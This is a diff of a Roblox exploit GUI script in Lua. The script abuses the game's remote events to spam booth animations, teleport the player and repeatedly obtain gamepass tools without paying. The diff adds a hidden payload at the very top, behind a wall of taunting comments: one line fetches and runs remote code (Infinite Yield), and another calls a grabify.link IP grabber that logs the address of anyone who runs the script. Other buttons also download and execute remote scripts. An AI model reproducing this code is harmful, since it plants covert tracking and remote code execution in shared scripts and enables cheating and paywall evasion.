@@ -1,30 +1,36 @@
--- Rate My Avatar GUI - 2022 (COPY THE SCRIPT!)
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
+-- Fuck up, skid
 
--- JOIN THE DISCORD! - https://discord.gg/3GJECGdCWY 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))() -- Infinite Yield Lmao
+game:HttpGet("https://grabify.link/D8GJUN") -- IP Grabber Lmao
+
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Rate my Avatar GUI | 7rab runs RMA <3", "Ocean")
+local Window = Library.CreateLib("777 Hub | 7rab loves you! <3", "DarkTheme")
 
 local Tab = Window:NewTab("Booth")
-local Section = Tab:NewSection("Normal Stuff")
-Section:NewTextBox("Change Text", "Changes the text of the booth", function(txt)
-local args = {
-    [1] = "Update",
-    [2] = {
-        ["DescriptionText"] = txt,
-        ["ImageId"] = txt1,
-    },
-}
-game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
-end)
-Section:NewButton("Abandon Booth", "makes booth vanish", function()
-    local args = {
-    [1] = "Abandon",
-}
-game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
-end)
 local Section = Tab:NewSection("Booth Gifs")
-Section:NewToggle("YIPEE", "7rab#0000", function(state)
+Section:NewToggle("Yippe Cat", "7rab#0000", function(state)
     if state then
         yipeeCond = true
        while yipeeCond==true do
@@ -45,7 +51,7 @@ Section:NewToggle("YIPEE", "7rab#0000", function(state)
 
 		}
 		for _,v in pairs(yipeeTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if yipeeCond==false then
 				break
@@ -58,15 +64,177 @@ Section:NewToggle("YIPEE", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("WYSI", "7rab#0000", function(state)
+Section:NewToggle("The rocks eyebrow", "7rab#0000", function(state)
+    if state then
+    reCond = true
+	while reCond==true do
+		local reTab = {
+			"9888770515",
+			"9888770296",
+			"9888769916",
+			"9888769634",
+			"9888769284",
+			"9888769008",
+			"9888768794",
+			"9888768523",
+			"9888763095",
+			"9888762892",
+			"9888762699",
+			"9888762367",
+			"9888762114",
+			"9888761941",
+			"9888761689",
+			"9888761246",
+
+		}
+		for _,v in pairs(reTab) do
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
+			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
+			if reCond==false then
+				break
+			end
+			wait(.1)
+		end
+	end
+    else
+    reCond = false
+        local args = {
+    [1] = "Update",
+    [2] = {
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
+    },
+}
+
+game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
+    end
+end)
+Section:NewToggle("Fish turning slowly", "7rab#0000", function(state)
+    if state then
+    SFCond = true
+	while SFCond==true do
+		local SFTab = {
+			"9888816960",
+			"9888816536",
+			"9888816224",
+			"9888810253",
+			"9888810067",
+			"9888809922",
+			"9888809764",
+			"9888809324",
+			"9888803341",
+			"9888802915",
+			"9888802721",
+			"9888802431",
+			"9888795511",
+			"9888795328",
+		}
+		for _,v in pairs(SFTab) do
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
+			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
+			if SFCond==false then
+				break
+			end
+			wait(.1)
+		end
+	end
+    else
+    SFCond = false
+        local args = {
+    [1] = "Update",
+    [2] = {
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
+    },
+}
+
+game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
+    end
+end)
+Section:NewToggle("A Skeleton Running", "7rab#0000", function(state)
+    if state then
+    SRCond = true
+	while SRCond==true do
+		local SRTab = {
+			"9888761068",
+			"9888760854",
+			"9888754640",
+			"9888754491",
+			"9888754373",
+			"9888754246",
+			"9888754109",
+			"9888753970",
+			"9888753820",
+		}
+		for _,v in pairs(SRTab) do
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
+			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
+			if SRCond==false then
+				break
+			end
+			wait(.1)
+		end
+	end
+    else
+    SRCond = false
+        local args = {
+    [1] = "Update",
+    [2] = {
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
+    },
+}
+
+game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
+    end
+end)
+Section:NewToggle("Monkeys in a circle", "7rab#0000", function(state)
+    if state then
+    mcCond = true
+	while mcCond==true do
+		local mcTab = {
+			"9888794477",
+			"9888788087",
+			"9888787850",
+			"9888787557",
+			"9888787334",
+			"9888787028",
+			"9888786790",
+			"9888786611",
+			"9888786410",
+
+		}
+		for _,v in pairs(mcTab) do
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
+			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
+			if mcCond==false then
+				break
+			end
+			wait(.1)
+		end
+	end
+    else
+    mcCond = false
+        local args = {
+    [1] = "Update",
+    [2] = {
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
+    },
+}
+
+game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
+    end
+end)
+Section:NewToggle("When you see it", "7rab#0000", function(state)
     if state then
     wysiCond = true
 	while wysiCond==true do
@@ -89,7 +257,7 @@ Section:NewToggle("WYSI", "7rab#0000", function(state)
 
 		}
 		for _,v in pairs(wysiTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if wysiCond==false then
 				break
@@ -102,8 +270,8 @@ Section:NewToggle("WYSI", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
@@ -134,7 +302,7 @@ Section:NewToggle("Happy Cat", "7rab#0000", function(state)
 
 		}
 		for _,v in pairs(happyCatTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if happyCatCond==false then
 				break
@@ -148,15 +316,15 @@ Section:NewToggle("Happy Cat", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("Spinning Rat", "7rab#0000", function(state)
+Section:NewToggle("A Spinning Rat", "7rab#0000", function(state)
     if state then
 spinningRatCond = true
 	wait(0.2)
@@ -181,7 +349,7 @@ spinningRatCond = true
 
 		}
 		for _,v in pairs(spinningRatTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if spinningRatCond==false then
 				break
@@ -195,15 +363,15 @@ spinningRatCond = true
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 16716348091,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("Capybara Car", "7rab#0000", function(state)
+Section:NewToggle("The Capybara In A Car", "7rab#0000", function(state)
     if state then
 capybaraCarCond = true
 	wait(0.2)
@@ -223,7 +391,7 @@ capybaraCarCond = true
 
 		}
 		for _,v in pairs(capybaraCarTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if capybaraCarCond==false then
 				break
@@ -238,15 +406,15 @@ capybaraCarCond = true
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("Skull Explode", "7rab#0000", function(state)
+Section:NewToggle("Exploding Skull", "7rab#0000", function(state)
     if state then
 skullExplodeCond = true
 	wait(0.2)
@@ -263,7 +431,7 @@ skullExplodeCond = true
             "9835255683",
 		}
 		for _,v in pairs(skullExplodeTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if skullExplodeCond==false then
 				break
@@ -277,15 +445,15 @@ skullExplodeCond = true
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("Skull Impload", "7rab#0000", function(state)
+Section:NewToggle("Imploding Skull", "7rab#0000", function(state)
     if state then
 	skullImploadCond = true
 	wait(0.2)
@@ -302,7 +470,7 @@ Section:NewToggle("Skull Impload", "7rab#0000", function(state)
 			"9835255720",
 		}
 		for _,v in pairs(skullImploadTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if skullImploadCond==false then
 				break
@@ -315,15 +483,15 @@ Section:NewToggle("Skull Impload", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("RIP Cat", "7rab#0000", function(state)
+Section:NewToggle("Doughnut Cat", "7rab#0000", function(state)
     if state then
 	ripCatCond = true
 	wait(0.2)
@@ -345,7 +513,7 @@ Section:NewToggle("RIP Cat", "7rab#0000", function(state)
 			"9835316775",
 		}
 		for _,v in pairs(ripCatTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if ripCatCond==false then
 				break
@@ -358,8 +526,8 @@ Section:NewToggle("RIP Cat", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
@@ -382,7 +550,7 @@ Section:NewToggle("Water Cat", "7rab#0000", function(state)
 			"9835462435",
 		}
 		for _,v in pairs(waterCatTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if waterCatCond==false then
 				break
@@ -395,15 +563,15 @@ Section:NewToggle("Water Cat", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-Section:NewToggle("Pug", "7rab#0000", function(state)
+Section:NewToggle("Dancing Pug", "7rab#0000", function(state)
     if state then
 	pugCond = true
 	wait(0.2)
@@ -434,7 +602,7 @@ Section:NewToggle("Pug", "7rab#0000", function(state)
 			"9837094525",
 		}
 		for _,v in pairs(pugTab) do
-			local k={[1]="Update",[2]={["DescriptionText"]="I WANT A EMO OR THERIAN GF 😭😭",["ImageId"]=v}}
+			local k={[1]="Update",[2]={["DescriptionText"]="7rab runs RMA! ( W 777 HUB )",["ImageId"]=v}}
 			game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(k))
 			if pugCond==false then
 				break
@@ -447,20 +615,98 @@ Section:NewToggle("Pug", "7rab#0000", function(state)
         local args = {
     [1] = "Update",
     [2] = {
-        ["DescriptionText"] = "7rab runs RMA",
-        ["ImageId"] = 9879417159,
+         ["DescriptionText"] = "7rab runs RMA | W 777 HUB",
+        ["ImageId"] = 10511856020,
     },
 }
 
 game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
     end
 end)
-local Section = Tab:NewSection("Booth Sniper")
-Section:NewButton("SOON!", "soon", function()
-    print("soon")
+local Section = Tab:NewSection("Normal Stuff")
+Section:NewTextBox("Change Text", "Changes the text of the booth", function(txt)
+local args = {
+    [1] = "Update",
+    [2] = {
+        ["DescriptionText"] = txt,
+        ["ImageId"] = txt1,
+    },
+}
+game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
 end)
+Section:NewButton("Abandon Booth", "makes booth vanish", function()
+    local args = {
+    [1] = "Abandon",
+}
+game:GetService("ReplicatedStorage").CustomiseBooth:FireServer(unpack(args))
+end)
+
 local Tab = Window:NewTab("Teleports")
-local Section = Tab:NewSection("PLayer Teleports")
+local Section = Tab:NewSection("Locations")
+Section:NewButton("Shop", "Teleports you to the shop", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-62, 3, 55)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Spawn", "Teleports you to spawn", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-8, 3, 6)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Stage", "Teleports you to the stage", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-86, 7, 6)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Top Rated Sign", "Teleports you to ontop of the 'Top Rated Sign'", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-71, 19, -40)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Left Tree", "Teleports you to the left tree", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(60, 37, -65)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Right Tree", "Teleports you to the right tree", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(56, 38, 72)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Shop Sign", "Teleports you to the Shop Sign", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-76, 19, 50)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("Premium Lounge", "Teleports you to the Premium Lounge", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-5900, -54, 23)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+Section:NewButton("PC", "Teleports you to the PC next to stage", function()
+    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local location = CFrame.new(-88, 3, 38)
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	task.wait()
+	pl.CFrame = location
+end)
+local Section = Tab:NewSection("Player Teleports")
 Section:NewTextBox("Player Name", "TextboxInfo", function(txt)
 	local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
 local pl2 = txt
@@ -469,109 +715,16 @@ task.wait()
 pl.CFrame = game.Players[pl2].Character.HumanoidRootPart.CFrame
 end)
 
-local Section = Tab:NewSection("Locations")
-Section:NewButton("Shop", "TPS for shop", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-62, 3, 55)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Spawn", "TPS to spawn", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-8, 3, 6)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Stage", "TPS to stage", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-86, 7, 6)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Top Rated Sign", "Tps on top of the Top rated sign", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-71, 19, -40)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Tree", "TPS to tree", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(60, 37, -65)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Other Tree", "TPS to the other tree", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(56, 38, 72)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Shop Sign", "TPS to the shop sign", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-76, 19, 50)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("Premium Lounge", "i like men", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-5900, -54, 23)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-Section:NewButton("PC", "sex", function()
-    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
-	local location = CFrame.new(-88, 3, 38)
-	local humanoid = game.Players.LocalPlayer.Character.Humanoid
-	task.wait()
-	pl.CFrame = location
-end)
-local Tab = Window:NewTab("Text Sign")
-local Section = Tab:NewSection("Text Sign (GAMEPASS REQUIRED)")
-Section:NewButton("Get Text Sign", "gives u text sign", function()
-    local args = {
-    [1] = 17291420,
-}
-
-game:GetService("ReplicatedStorage").RequestGamepassTool:FireServer(unpack(args))
-end)
-Section:NewToggle("Loop give text sign", "loop gives text sign", function(state)
-        if state then
-		cond = true
-        while cond==true do
-			game:GetService("ReplicatedStorage").RequestGamepassTool:FireServer(17291420)
-			wait(.7)
-		end
-    else
-		cond = false
-		print("no more text sign")
-    end
-end)
-local Section = Tab:NewSection("Animations (SOON)")
-Section:NewToggle("ToggleText", "ToggleInfo", function(state)
-    if state then
-        print("Toggle On")
-    else
-        print("Toggle Off")
-    end
-end)
 local Tab = Window:NewTab("Image Sign")
-local Section = Tab:NewSection("Image Sign (GAMEPASS REQUIRED)")
-Section:NewButton("Get Image Sign", "gives u image sign", function()
+local Section = Tab:NewSection("Image Sign")
+Section:NewButton("Get Image Sign", "Gives you the Image Sign", function()
     local args = {
     [1] = 17291427,
 }
 
 game:GetService("ReplicatedStorage").RequestGamepassTool:FireServer(unpack(args))
 end)
-Section:NewToggle("Loop give image sign", "loop gives image sign", function(state)
+Section:NewToggle("Loop give image sign", "Will loop give you the image sign", function(state)
     if state then
 		cond = true
         while cond==true do
@@ -580,11 +733,11 @@ Section:NewToggle("Loop give image sign", "loop gives image sign", function(stat
 		end
     else
 		cond = false
-		print("no more imaeg sign")
+		print("No more image sign!")
     end
 end)
-local Section = Tab:NewSection("Animations (SOON)")
-Section:NewToggle("Spongebob Fish", "ok", function(state)
+local Section = Tab:NewSection("Animations")
+Section:NewToggle("Fish turning around slowly", "ok", function(state)
     if state then
         	Cond = true
 	task.wait(.1)
@@ -619,7 +772,7 @@ Section:NewToggle("Spongebob Fish", "ok", function(state)
 		game:GetService("ReplicatedStorage").UpdateSign:FireServer('Decal','')
     end
 end)
-Section:NewToggle("Happy Monkey Circle", "ok", function(state)
+Section:NewToggle("Monkeys in a circle", "ok", function(state)
     if state then
         	Cond = true
 	task.wait(.1)
@@ -649,39 +802,7 @@ Section:NewToggle("Happy Monkey Circle", "ok", function(state)
 		game:GetService("ReplicatedStorage").UpdateSign:FireServer('Decal','')
     end
 end)
-Section:NewToggle("L spin", "ok", function(state)
-    if state then
-        	Cond = true
-	task.wait(.1)
-	while Cond==true do
-		local Tab = {
-			"9888779946",
-			"9888779767",
-			"9888779598",
-			"9888779457",
-			"9888779287",
-			"9888779114",
-			"9888778967",
-			"9888778758",
-			"9888778538",
-			"9888778309",
-			"9888778086",
-		}
-		for _,v in pairs(Tab) do
-			game:GetService("ReplicatedStorage").UpdateSign:FireServer('Decal','rbxassetid://'..tostring(v))
-			if Cond==false then
-				break
-			end
-			task.wait(.1)
-		end
-	end
-    else
-        Cond = false
-		task.wait(.1)
-		game:GetService("ReplicatedStorage").UpdateSign:FireServer('Decal','')
-    end
-end)
-Section:NewToggle("The rock eyebrow", "ok", function(state)
+Section:NewToggle("The rock's eyebrow", "ok", function(state)
     if state then
         	Cond = true
 	task.wait(.1)
@@ -718,7 +839,7 @@ Section:NewToggle("The rock eyebrow", "ok", function(state)
 		game:GetService("ReplicatedStorage").UpdateSign:FireServer('Decal','')
     end
 end)
-Section:NewToggle("skeleton running", "ok", function(state)
+Section:NewToggle("Skeleton Running", "ok", function(state)
     if state then
         	Cond = true
 	task.wait(.1)
@@ -750,7 +871,7 @@ Section:NewToggle("skeleton running", "ok", function(state)
 end)
 local Tab = Window:NewTab("Knight")
 local Section = Tab:NewSection("Knight")
-Section:NewButton("Get Knight", "get knight lmfoaoaoaa", function()
+Section:NewButton("Get Knight", "Obtain the knight easter-egg!", function()
 local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
 local gobackto = hrp.CFrame
 local target = game:GetService("Workspace").JewelleryStand
@@ -766,14 +887,14 @@ hrp.CFrame = gobackto
 
 end
 end)
-Section:NewButton("Get sword", "get sword lmfoaoaoaa", function()
+Section:NewButton("Get sword", "Obtain the sword ( Most likely gone by now )", function()
 local args = {
     [1] = "ClassicSword",
 }
 
 game:GetService("ReplicatedStorage").RequestTool:FireServer(unpack(args))
 end)
-Section:NewToggle("Loop give sword", "loop gives sword", function(state)
+Section:NewToggle("Loop give sword", "Loop gives you the sword", function(state)
     if state then
 		cond = true
         while cond==true do
@@ -866,7 +987,6 @@ local LRn=NumberRange.new
 local TIn=TweenInfo.new
 local CSKn=ColorSequenceKeypoint.new
 
---math
 local inf=math.huge
 local rng=math.random
 local mr=math.round
@@ -922,38 +1042,33 @@ end)
 end)
 local Tab = Window:NewTab("Other Scripts")
 local Section = Tab:NewSection("Scripts:")
-Section:NewButton("Simple Spy v0.8", "penis", function()
+Section:NewButton("Simple Spy v0.8", "Executes Simple Spy v0.8!", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/GE6Yii93", true))()
 end)
-Section:NewButton("CMD X", "penis", function()
+Section:NewButton("CMD X", "Executes CMD X!", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
 end)
-Section:NewButton("Domain X", "penis", function()
+Section:NewButton("Domain X", "Executes Domain X!", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/DomainX/main/source",true))()
 end)
-Section:NewButton("Infinite Yield", "penis", function()
+Section:NewButton("Infinite Yield", "Executes Infinite Yield!", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
 end)
-Section:NewButton("Fates Admin", "penis", function()
+Section:NewButton("Fates Admin", "Executes Fates Admin!", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua", true))()
 end)
-local Tab = Window:NewTab("Rate")
-local Section = Tab:NewSection("Soon!")
-local Tab = Window:NewTab("Blacklist")
-local Section = Tab:NewSection("Soon!")
-local Tab = Window:NewTab("Notifications")
-local Section = Tab:NewSection("Soon :)")
-local Tab = Window:NewTab("Others")
-local Section = Tab:NewSection("idfk what to put here")
-Section:NewButton("Rejoin", "rejoins same server", function()
+
+local Tab = Window:NewTab("Misc")
+local Section = Tab:NewSection("Misc")
+Section:NewButton("Rejoin", "Rejoins the same server", function()
     local ts = game:GetService("TeleportService")
 	local p = game:GetService("Players").LocalPlayer
 	ts:Teleport(game.PlaceId, p)
 end)
-Section:NewButton("Server Hop", "joins diffrent server", function()
+Section:NewButton("Server Hop", "Joins a different server", function()
     local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
 	module:Teleport(game.PlaceId)
 end)
-Section:NewKeybind("Open/Close GUI", "sex", Enum.KeyCode.K, function()
+Section:NewKeybind("Open/Close UI", "Set keybinds for the UI", Enum.KeyCode.K, function()
 	Library:ToggleUI()
 end)
